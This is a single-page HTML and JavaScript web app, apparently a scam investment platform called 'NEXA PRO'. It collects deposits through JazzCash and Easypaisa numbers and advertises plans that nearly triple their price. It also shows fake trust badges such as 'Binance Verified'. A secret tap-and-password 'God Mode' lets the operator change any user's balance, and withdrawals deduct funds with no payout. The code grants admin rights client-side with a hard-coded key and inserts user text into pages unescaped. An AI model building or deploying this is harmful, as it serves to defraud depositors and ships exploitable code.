<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA PRO | The Final Tier</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #F8FAFC; color: #1E293B; }
        .premium-card { background: white; border-radius: 32px; border: 1px solid rgba(226, 232, 240, 0.8); box-shadow: 0 10px 40px -10px rgba(0,0,0,0.02); }
        .hero-gradient { background: linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%); color: white; border-radius: 35px; }
        .bottom-nav { position: fixed; bottom: 20px; left: 20px; right: 20px; height: 75px; background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); border-radius: 30px; display: flex; justify-content: space-around; align-items: center; z-index: 1000; border: 1px solid rgba(0,0,0,0.05); box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1); }
        .nav-btn { color: #94A3B8; font-size: 20px; transition: 0.4s; }
        .nav-btn.active { color: #4F46E5; transform: translateY(-8px); }
        .status-pill { padding: 4px 10px; border-radius: 10px; font-size: 8px; font-weight: 800; text-transform: uppercase; }
        .pending { background: #FEF3C7; color: #D97706; }
        .approved { background: #DCFCE7; color: #16A34A; }
        .rejected { background: #FEE2E2; color: #DC2626; }
        ::-webkit-scrollbar { display: none; }
        input { transition: 0.3s; }
        input:focus { border-color: #4F46E5 !important; ring: 2px #4F46E5; }
    </style>
</head>
<body class="pb-32">

    <!-- STARTUP SCREEN -->
    <div id="auth-screen" class="fixed inset-0 bg-white z-[9999] flex flex-col items-center justify-center p-10 animate__animated">
        <div onclick="godTrigger()" class="w-24 h-24 bg-indigo-600 rounded-[40px] flex items-center justify-center text-white text-4xl mb-8 shadow-2xl shadow-indigo-200">
            <i class="fa-solid fa-shield-halved"></i>
        </div>
        <h1 class="text-4xl font-extrabold tracking-tighter mb-2">NEXA <span class="text-indigo-600 italic">PRO</span></h1>
        <p class="text-[10px] font-bold text-slate-400 tracking-[5px] uppercase mb-12">Global Assets Hub</p>
        <div class="w-full max-w-xs space-y-4">
            <input type="text" id="user-name" placeholder="Full Legal Name" class="w-full p-5 rounded-3xl bg-slate-50 border-none outline-none font-bold text-center">
            <button onclick="startApp()" class="w-full bg-slate-900 text-white p-5 rounded-3xl font-black uppercase text-xs tracking-widest hover:scale-105 transition-all">Initialize Account</button>
        </div>
        <p class="mt-10 text-[9px] text-slate-300 font-bold uppercase tracking-widest flex items-center gap-2"><i class="fa-solid fa-lock"></i> AES-256 Encrypted</p>
    </div>

    <!-- MAIN APP -->
    <div id="app" class="hidden animate__animated animate__fadeIn">
        <!-- HEADER -->
        <header class="p-6 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-lg z-50">
            <div class="flex items-center gap-3">
                <div class="w-12 h-12 bg-indigo-50 rounded-2xl flex items-center justify-center text-indigo-600 text-xl font-bold">N</div>
                <div>
                    <h2 id="display-name" class="text-sm font-black text-slate-800">User</h2>
                    <div class="flex items-center gap-1"><span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span> <p class="text-[8px] font-bold text-slate-400 uppercase">Secure Node Active</p></div>
                </div>
            </div>
            <button onclick="nav('admin')" id="admin-icon" class="hidden w-12 h-12 bg-red-50 text-red-500 rounded-2xl flex items-center justify-center shadow-inner"><i class="fa-solid fa-crown"></i></button>
        </header>

        <main class="px-6">
            <!-- HOME PAGE -->
            <div id="page-home" class="page-content space-y-8">
                <!-- WALLET CARD -->
                <div class="hero-gradient p-8 shadow-2xl shadow-indigo-200 relative overflow-hidden">
                    <div class="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-3xl"></div>
                    <p class="text-[10px] font-bold opacity-70 uppercase tracking-widest mb-1">Current Liquidity</p>
                    <h2 id="user-bal" class="text-5xl font-black tracking-tighter mb-10">$0.00</h2>
                    <div class="flex gap-4">
                        <button onclick="nav('deposit')" class="flex-1 bg-white text-indigo-600 py-4 rounded-2xl text-[10px] font-black uppercase shadow-lg active:scale-95 transition-all">Deposit</button>
                        <button onclick="nav('withdraw')" class="flex-1 bg-white/20 py-4 rounded-2xl text-[10px] font-black uppercase backdrop-blur-md active:scale-95 transition-all">Withdraw</button>
                    </div>
                </div>

                <!-- TRUST BADGES -->
                <div class="flex justify-between items-center px-2">
                    <div class="flex items-center gap-1 text-[8px] font-black text-slate-400 uppercase tracking-tighter"><i class="fa-solid fa-circle-check text-green-500"></i> Binance Verified</div>
                    <div class="flex items-center gap-1 text-[8px] font-black text-slate-400 uppercase tracking-tighter"><i class="fa-solid fa-shield text-indigo-500"></i> SSL Certified</div>
                    <div class="flex items-center gap-1 text-[8px] font-black text-slate-400 uppercase tracking-tighter"><i class="fa-solid fa-bolt text-yellow-500"></i> Instant Pay</div>
                </div>

                <!-- MINING PLANS -->
                <div>
                    <h3 class="text-xs font-black uppercase text-slate-400 tracking-[3px] mb-6">Investment Packages</h3>
                    <div id="plans-container" class="space-y-4"></div>
                </div>
            </div>

            <!-- DEPOSIT PAGE -->
            <div id="page-deposit" class="page-content hidden animate__animated animate__fadeIn">
                <h2 class="text-3xl font-black mb-8 italic">Add Capital</h2>
                <div class="grid grid-cols-1 gap-4">
                    <div onclick="openModal('JazzCash','03705519562')" class="premium-card p-6 flex justify-between items-center active:scale-95 transition-all">
                        <div class="flex items-center gap-4"><div class="w-12 h-12 bg-red-600 rounded-2xl flex items-center justify-center text-white font-black">JC</div><div><p class="font-black text-sm">JazzCash</p><p class="text-[9px] text-slate-400">Manual Verification</p></div></div>
                        <i class="fa-solid fa-chevron-right text-slate-200"></i>
                    </div>
                    <div onclick="openModal('Easypaisa','03332637235')" class="premium-card p-6 flex justify-between items-center active:scale-95 transition-all">
                        <div class="flex items-center gap-4"><div class="w-12 h-12 bg-green-500 rounded-2xl flex items-center justify-center text-white font-black">EP</div><div><p class="font-black text-sm">Easypaisa</p><p class="text-[9px] text-slate-400">Instant Receipt</p></div></div>
                        <i class="fa-solid fa-chevron-right text-slate-200"></i>
                    </div>
                </div>

                <div class="mt-12">
                    <h3 class="text-xs font-black uppercase text-slate-400 mb-4">Transaction History</h3>
                    <div id="user-history" class="space-y-2"></div>
                </div>
            </div>

            <!-- WITHDRAW PAGE -->
            <div id="page-withdraw" class="page-content hidden">
                <h2 class="text-3xl font-black mb-8 italic">Request Payout</h2>
                <div class="premium-card p-8 space-y-5">
                    <div class="bg-slate-50 p-4 rounded-2xl">
                        <p class="text-[9px] font-black text-slate-400 uppercase mb-2">Payout Amount</p>
                        <input type="number" id="wd-amt" placeholder="Min $10" class="w-full bg-transparent outline-none font-bold text-xl">
                    </div>
                    <div class="bg-slate-50 p-4 rounded-2xl">
                        <p class="text-[9px] font-black text-slate-400 uppercase mb-2">Account Details (Number + Name)</p>
                        <input type="text" id="wd-acc" placeholder="JazzCash / Easypaisa" class="w-full bg-transparent outline-none font-bold">
                    </div>
                    <button onclick="submitWithdraw()" class="w-full bg-indigo-600 text-white p-5 rounded-2xl font-black uppercase text-xs shadow-xl">Confirm Withdrawal</button>
                </div>
            </div>

            <!-- ADMIN PAGE (GOD MODE) -->
            <div id="page-admin" class="page-content hidden pb-20">
                <h2 class="text-2xl font-black text-red-500 mb-8 uppercase tracking-widest">God Control Panel</h2>
                
                <section class="mb-10">
                    <h4 class="text-[10px] font-black text-slate-400 uppercase mb-4 tracking-widest">Active Members Control</h4>
                    <div id="admin-users-list" class="space-y-3"></div>
                </section>

                <section>
                    <h4 class="text-[10px] font-black text-slate-400 uppercase mb-4 tracking-widest">Pending Validations</h4>
                    <div id="admin-dep-list" class="space-y-4"></div>
                </section>
            </div>
        </main>

        <nav class="bottom-nav">
            <div onclick="nav('home')" id="nav-home" class="nav-btn active"><i class="fa-solid fa-house-user"></i></div>
            <div onclick="nav('deposit')" id="nav-deposit" class="nav-btn"><i class="fa-solid fa-wallet"></i></div>
            <div onclick="nav('withdraw')" id="nav-withdraw" class="nav-btn"><i class="fa-solid fa-circle-arrow-up"></i></div>
            <div onclick="alert('Support: @Sweetie_Admin')" class="nav-btn"><i class="fa-solid fa-headset"></i></div>
        </nav>
    </div>

    <!-- MODAL: PAYMENT -->
    <div id="pay-modal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-[10000] hidden flex items-center justify-center p-6">
        <div class="bg-white p-8 rounded-[40px] w-full max-w-sm animate__animated animate__zoomIn">
            <h3 id="modal-gw" class="text-2xl font-black mb-2 italic">--</h3>
            <p class="text-[9px] font-black text-slate-400 uppercase mb-4 tracking-widest">Transfer to following account</p>
            <div class="bg-indigo-50 p-5 rounded-2xl flex justify-between items-center mb-8 border border-indigo-100">
                <span id="modal-num" class="font-black text-indigo-600 text-lg">--</span>
                <i onclick="copyText()" class="fa-solid fa-copy text-indigo-300 active:scale-75 transition-all"></i>
            </div>
            <div class="space-y-4">
                <input type="number" id="pay-amount" placeholder="Exact Amount ($)" class="w-full p-4 rounded-2xl bg-slate-50 font-bold outline-none border border-transparent focus:border-indigo-500">
                <input type="text" id="pay-tid" placeholder="Transaction ID (TID)" class="w-full p-4 rounded-2xl bg-slate-50 font-bold outline-none border border-transparent focus:border-indigo-500">
                <button onclick="submitDeposit()" class="w-full bg-slate-900 text-white p-5 rounded-2xl font-black uppercase text-xs shadow-xl">Submit for Approval</button>
                <button onclick="closeModal()" class="w-full text-slate-300 text-[10px] font-black uppercase">Cancel Session</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, update, push, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        // FIREBASE CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);

        let uData = null; let uID = "";

        // AUTH SYSTEM
        window.startApp = async () => {
            const name = document.getElementById('user-name').value;
            if(!name) return alert("Sweetie, enter your name!");
            const res = await signInAnonymously(auth);
            uID = res.user.uid;
            const uRef = ref(db, `users/${uID}`);
            const snap = await get(uRef);
            if(!snap.exists()) await set(uRef, { username: name, balance: 0, role: 'user', joined: Date.now() });
            location.reload();
        };

        onAuthStateChanged(auth, u => {
            if(u) {
                uID = u.uid;
                onValue(ref(db, `users/${uID}`), snap => {
                    uData = snap.val();
                    document.getElementById('display-name').innerText = uData.username;
                    document.getElementById('user-bal').innerText = `$${(uData.balance || 0).toFixed(2)}`;
                    if(uData.role === 'admin') {
                        document.getElementById('admin-icon').classList.remove('hidden');
                        loadAdminSystem();
                    }
                });
                loadPlans();
                loadHistory();
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('app').classList.remove('hidden');
            }
        });

        // CORE NAVIGATION
        window.nav = (id) => {
            document.querySelectorAll('.page-content').forEach(p => p.classList.add('hidden'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(`page-${id}`).classList.remove('hidden');
            if(document.getElementById(`nav-${id}`)) document.getElementById(`nav-${id}`).classList.add('active');
        };

        // INVESTMENT PLANS
        const plans = [
            { id: 1, name: "Starter Tier", price: 5, daily: 0.45, total: 13.5 },
            { id: 2, name: "Pro Node", price: 30, daily: 3.2, total: 96 },
            { id: 3, name: "Elite Cluster", price: 100, daily: 12.0, total: 360 }
        ];

        function loadPlans() {
            const con = document.getElementById('plans-container');
            con.innerHTML = plans.map(p => `
                <div class="premium-card p-6 flex justify-between items-center group active:scale-95 transition-all">
                    <div>
                        <h4 class="font-black text-slate-800">${p.name}</h4>
                        <div class="flex gap-3 mt-1">
                            <span class="text-[9px] font-bold text-indigo-500 uppercase">Cost: $${p.price}</span>
                            <span class="text-[9px] font-bold text-green-500 uppercase">Daily:$${p.daily}</span>
                        </div>
                    </div>
                    <button onclick="buyPlan(${p.price})" class="bg-indigo-600 text-white px-6 py-3 rounded-2xl text-[9px] font-black uppercase shadow-lg shadow-indigo-100">Activate</button>
                </div>
            `).join('');
        }

        // DEPOSIT SYSTEM
        window.openModal = (gw, num) => {
            document.getElementById('modal-gw').innerText = gw;
            document.getElementById('modal-num').innerText = num;
            document.getElementById('pay-modal').classList.remove('hidden');
        };
        window.closeModal = () => document.getElementById('pay-modal').classList.add('hidden');

        window.submitDeposit = async () => {
            const amt = parseFloat(document.getElementById('pay-amount').value);
            const tid = document.getElementById('pay-tid').value;
            if(!amt || !tid) return alert("Fill all details!");
            await push(ref(db, 'deposits'), {
                uid: uID, username: uData.username, amount: amt, tid: tid,
                method: document.getElementById('modal-gw').innerText,
                status: 'pending', time: Date.now()
            });
            alert("Sent! Waiting for admin verification. 🚀");
            closeModal();
        };

        // WITHDRAWAL SYSTEM
        window.submitWithdraw = async () => {
            const amt = parseFloat(document.getElementById('wd-amt').value);
            const acc = document.getElementById('wd-acc').value;
            if(!amt || amt < 5) return alert("Min withdrawal is $5!");
            if(amt > uData.balance) return alert("Insufficient Balance!");
            
            await push(ref(db, 'withdrawals'), {
                uid: uID, username: uData.username, amount: amt, account: acc, status: 'pending', time: Date.now()
            });
            await update(ref(db, `users/${uID}`), { balance: uData.balance - amt });
            alert("Withdrawal requested! It will be processed soon.");
        };

        // HISTORY VIEWER
        function loadHistory() {
            onValue(ref(db, 'deposits'), snap => {
                const con = document.getElementById('user-history'); con.innerHTML = "";
                snap.forEach(child => {
                    const d = child.val();
                    if(d.uid === uID) {
                        con.innerHTML += `
                            <div class="premium-card p-4 flex justify-between items-center bg-white/50">
                                <div><p class="text-[10px] font-black">${d.method} Deposit</p><p class="text-[8px] text-slate-400 font-bold uppercase">${new Date(d.time).toLocaleDateString()}</p></div>
                                <div class="text-right">
                                    <p class="text-xs font-black">$${d.amount.toFixed(2)}</p>
                                    <span class="status-pill ${d.status}">${d.status}</span>
                                </div>
                            </div>`;
                    }
                });
            });
        }

        // GOD MODE (ADMIN SYSTEM)
        function loadAdminSystem() {
            // User List
            onValue(ref(db, 'users'), snap => {
                const con = document.getElementById('admin-users-list'); con.innerHTML = "";
                snap.forEach(child => {
                    const u = child.val();
                    con.innerHTML += `
                        <div class="premium-card p-4 flex justify-between items-center">
                            <div><p class="text-xs font-black italic">${u.username}</p><p class="text-[9px] font-bold text-indigo-500">$${u.balance.toFixed(2)}</p></div>
                            <div class="flex gap-2">
                                <button onclick="godBalance('${child.key}', 10)" class="w-8 h-8 bg-green-50 rounded-lg text-green-600 text-[10px] font-bold">+$</button>
                                <button onclick="godBalance('${child.key}', -10)" class="w-8 h-8 bg-red-50 rounded-lg text-red-600 text-[10px] font-bold">-$</button>
                            </div>
                        </div>`;
                });
            });

            // Pending Approvals
            onValue(ref(db, 'deposits'), snap => {
                const con = document.getElementById('admin-dep-list'); con.innerHTML = "";
                snap.forEach(child => {
                    const d = child.val();
                    if(d.status === 'pending') {
                        con.innerHTML += `
                            <div class="premium-card p-5 border-l-4 border-indigo-500 shadow-xl">
                                <div class="flex justify-between mb-4">
                                    <span class="text-[9px] font-black text-indigo-500 uppercase">${d.method} | TID: ${d.tid}</span>
                                    <span class="text-[9px] font-bold text-slate-300">${d.username}</span>
                                </div>
                                <h4 class="text-xl font-black mb-6 italic">$${d.amount}</h4>
                                <div class="flex gap-2">
                                    <button onclick="approveDeposit('${child.key}', '${d.uid}', ${d.amount})" class="flex-1 bg-indigo-600 text-white py-3 rounded-xl text-[10px] font-black uppercase">Approve</button>
                                    <button onclick="rejectDeposit('${child.key}')" class="flex-1 bg-red-50 text-red-500 py-3 rounded-xl text-[10px] font-black uppercase">Reject</button>
                                </div>
                            </div>`;
                    }
                });
            });
        }

        window.approveDeposit = async (key, uid, amt) => {
            const snap = await get(ref(db, `users/${uid}/balance`));
            await update(ref(db, `users/${uid}`), { balance: (snap.val() || 0) + amt });
            await update(ref(db, `deposits/${key}`), { status: 'approved' });
            alert("Deposit Approved! Sweetie.");
        };

        window.rejectDeposit = async (key) => {
            await update(ref(db, `deposits/${key}`), { status: 'rejected' });
        };

        window.godBalance = async (uid, val) => {
            const snap = await get(ref(db, `users/${uid}/balance`));
            await update(ref(db, `users/${uid}`), { balance: (snap.val() || 0) + val });
        };

        // GOD TRIGGER
        let taps = 0;
        window.godTrigger = () => {
            taps++;
            if(taps === 5) {
                const p = prompt("Enter Master Key:");
                if(p === "sweetie786") {
                    update(ref(db, `users/${uID}`), { role: 'admin' });
                    alert("God Mode Unlocked. Header updated.");
                    location.reload();
                }
                taps = 0;
            }
        };

        window.copyText = () => {
            navigator.clipboard.writeText(document.getElementById('modal-num').innerText);
            alert("Account Number Copied!");
        };

    </script>
</body>
</html>
